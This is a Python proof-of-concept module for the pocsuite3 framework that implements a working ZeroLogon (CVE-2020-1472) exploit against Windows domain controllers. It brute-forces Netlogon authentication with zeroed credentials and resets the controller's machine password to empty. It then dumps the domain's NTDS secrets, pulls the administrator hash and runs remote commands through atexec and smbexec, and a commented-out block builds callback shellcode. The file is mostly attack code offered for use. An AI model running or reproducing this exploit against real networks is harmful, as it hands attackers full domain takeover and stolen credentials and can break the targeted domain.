"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, VUL_TYPE,OptString, get_listener_ip, get_listener_port
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import generate_shellcode_list
from collections import OrderedDict
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport

class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['ajatar']
    vulDate = '2020'
    createDate = '2020-10-25'
    updateDate = '2020-10-25'
    references = ['https://www.anquanke.com/post/id/219374#h3-5']
    name = 'CVE-2020-1472(ZeroLogon)'
    appPowerLink = ''
    appName = 'windows dc'
    appVersion = '<2012'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''攻击者只需能够访问域控的445端口，在无需任何凭据的情况下能拿到域管的权限。该漏洞的产生来源于Netlogon协议认证的加密模块存在缺陷，导致攻击者可以在没有凭证的情况情况下通过认证。该漏洞的最稳定利用是调用netlogon中RPC函数NetrServerPasswordSet2来重置域控的密码，从而以域控的身份进行Dcsync获取域管权限。'''
    samples = []
    install_requires = ["impacket"]
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''重置域控机器账号，读取域控密码（hash）'''

    def _options(self):
        o = OrderedDict()
        #o["dcip"] = OptString('', description='这个poc域控ip', require=True)
        o["dcname"] = OptString('', description='这个poc域控主机名',require=True)
        return o

    def try_zero_authenticate(self,dc_handle, dc_ip, target_computer):
        # Connect to the DC's Netlogon service.
        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

        # Use an all-zero challenge and credential.
        plaintext = b"\x00" * 8
        ciphertext = b"\x00" * 8

        # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
        flags = 0x212fffff

        # Send challenge and authentication request.
        nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                rpc_con, dc_handle + "\x00", target_computer + "$\x00",
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                         target_computer + "\x00", ciphertext, flags
            )

            # It worked!
            assert server_auth["ErrorCode"] == 0
            return rpc_con
        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xc0000022:
                return None
            else:
                print("Unexpected error code returned from DC: {}".format(ex.get_error_code()))
        except BaseException as ex:
            print("Unexpected error: {}".format(ex))

    def try_zerologon(self,dc_handle, rpc_con, target_computer):
        """
        Authenticator: A NETLOGON_AUTHENTICATOR structure, as specified in section 2.2.1.1.5, that contains the encrypted
        logon credential and a time stamp.

            typedef struct _NETLOGON_AUTHENTICATOR {
               NETLOGON_CREDENTIAL Credential;
               DWORD Timestamp;
             }

        Timestamp:  An integer value that contains the time of day at which the client constructed this authentication
        credential, represented as the number of elapsed seconds since 00:00:00 of January 1, 1970.
        The authenticator is constructed just before making a call to a method that requires its usage.

            typedef struct _NETLOGON_CREDENTIAL {
                CHAR data[8];
            }

        ClearNewPassword: A NL_TRUST_PASSWORD structure, as specified in section 2.2.1.3.7,
        that contains the new password encrypted as specified in Calling NetrServerPasswordSet2 (section 3.4.5.2.5).

            typedef struct _NL_TRUST_PASSWORD {
                WCHAR Buffer[256];
                ULONG Length;
            }

        ReturnAuthenticator: A NETLOGON_AUTHENTICATOR structure, as specified in section 2.2.1.1.5,
        that contains the server return authenticator.

        More info can be found on the [MS-NRPC]-170915.pdf
        """
        request = nrpc.NetrServerPasswordSet2()
        request["PrimaryName"] = dc_handle + "\x00"
        request["AccountName"] = target_computer + "$\x00"
        request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = b"\x00" * 8
        authenticator["Timestamp"] = 0
        request["Authenticator"] = authenticator
        request["ComputerName"] = target_computer + "\x00"
        request["ClearNewPassword"] = b"\x00" * 516
        return rpc_con.request(request)


    def _verify(self):
        result = {}
        # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
        MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
        dc_ip = self.url[7:]
        target_computer = self.get_option("dcname")
        dc_handle = "\\\\" + target_computer

        for attempt in range(0, MAX_ATTEMPTS):
            rpc_con = self.try_zero_authenticate(dc_handle, dc_ip, target_computer)

            if rpc_con is None:
                print("try zero authenticate.")
            else:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_computer + "@" + dc_ip
                result['VerifyInfo']['Postdata'] = type(rpc_con)
                break
        return self.parse_output(result)

    def _attack(self):
        results = {}
        MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
        dc_ip = self.url[7:]
        target_computer = self.get_option("dcname")
        dc_handle = "\\\\" + target_computer

        for attempt in range(0, MAX_ATTEMPTS):
            rpc_con = self.try_zero_authenticate(dc_handle, dc_ip, target_computer)

            if rpc_con is None:
                print("try zero authenticate.")
            else:
                break
        if rpc_con:
            result = self.try_zerologon(dc_handle, rpc_con, target_computer)
            if result["ErrorCode"] == 0:
                print(
                    "[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.")
                from pocsuite3.pocs.windowsexp.windows_secretsdump import GetSecrets
                from pocsuite3.pocs.windowsexp.windows_atexec import Atexec
                from pocsuite3.pocs.windowsexp.windows_smbexec import Smbexec
                import os
                target = target_computer + "$@" + dc_ip
                GetSecrets(target)

                secret_file = "./pocs/windowsexp/data/" + dc_ip + ".ntds"
                user_administrator = ""
                if os.path.exists(secret_file):
                    print("\n\nNtdsFile:"+secret_file)
                    with open(secret_file) as fileobj:
                        for content in fileobj:
                            if "500" in content:
                                user_administrator = content
                                break
                    print("\n\nReinstall original pw:")
                    a = user_administrator.split(":")[0] + "@" + dc_ip
                    b = user_administrator.split(":")[3]
                    c = "powershell Reset-ComputerMachinePassword"
                    Atexec(a, b, c)
                    Smbexec(a,b)

                results['AdminInfo'] = {}
                results['VerifyInfo'] = {}
                results['VerifyInfo']['URL'] = target_computer + "@" + dc_ip
                results['AdminInfo']['Username'] = user_administrator.split(":")[0]
                results['AdminInfo']['password_NTHash'] = user_administrator.split(":")[3]

            else:
                print(
                    "Exploit Failed: Non-zero return code, something went wrong. Domain Controller returned: {}".format(
                        result["ErrorCode"]))
        return self.parse_output(results)

    def _shell(self):
        MAX_ATTEMPTS = 2000  # False negative chance: 0.04%
        dc_ip = self.url[7:]
        target_computer = self.get_option("dcname")
        dc_handle = "\\\\" + target_computer

        for attempt in range(0, MAX_ATTEMPTS):
            rpc_con = self.try_zero_authenticate(dc_handle, dc_ip, target_computer)

            if rpc_con is None:
                print("try zero authenticate.")
            else:
                break
        if rpc_con:
            result = self.try_zerologon(dc_handle, rpc_con, target_computer)
            if result["ErrorCode"] == 0:
                print(
                    "[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.")
                from pocsuite3.pocs.windowsexp.windows_secretsdump import GetSecrets
                from pocsuite3.pocs.windowsexp.windows_atexec import Atexec
                from pocsuite3.pocs.windowsexp.windows_smbexec import Smbexec
                import os, time
                target = target_computer + "$@" + dc_ip
                GetSecrets(target)

                secret_file = "./pocs/windowsexp/data/" + dc_ip + ".ntds"
                user_administrator = ""
                if os.path.exists(secret_file):
                    print("\n\nNtdsFile:" + secret_file)
                    with open(secret_file) as fileobj:
                        for content in fileobj:
                            if "500" in content:
                                user_administrator = content
                                break
                    print("\n\nReinstall original pw:")
                    a = user_administrator.split(":")[0] + "@" + dc_ip
                    b = user_administrator.split(":")[3]
                    c = "powershell Reset-ComputerMachinePassword"
                    Atexec(a, b, c)
                    Smbexec(a,b)

                    # 生成写入文件的shellcode
                    # _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(),
                    #                                 os_target=OS.WINDOWS,
                    #                                 os_target_arch=OS_ARCH.X86)
                    # for i in _list:
                    #     c = i
                    #     Atexec(a, b, c)


            else:
                print(
                    "Exploit Failed: Non-zero return code, something went wrong. Domain Controller returned: {}".format(
                        result["ErrorCode"]))


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
